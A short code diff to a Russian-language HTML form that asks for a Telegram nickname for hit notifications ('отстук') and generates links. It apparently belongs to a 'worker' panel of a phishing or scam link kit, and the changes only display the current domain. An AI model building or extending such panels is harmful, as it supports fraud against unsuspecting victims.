@@ -101,6 +101,11 @@
             margin-top: 10px;
             display: none;
         }
+        .domain-info {
+            font-size: 12px;
+            color: #777;
+            margin-top: 10px;
+        }
     </style>
 </head>
 <body>
@@ -111,6 +116,7 @@
                 <label for="nick">Введи свой никнейм телеграм для отстука через @:</label>
                 <input type="text" id="nick" placeholder="@mynick" required>
                 <div class="error-message" id="error-message"></div>
+                <div class="domain-info">Текущий домен: <strong id="current-domain"></strong></div>
             </div>
             <button type="submit">Сгенерировать ссылку</button>
         </form>
@@ -118,6 +124,7 @@
     </div>
 
     <script>
+        document.getElementById('current-domain').textContent = window.location.origin;
         document.getElementById('workerForm').addEventListener('submit', function(e) {
             e.preventDefault();
             const nickInput = document.getElementById('nick').value.trim();
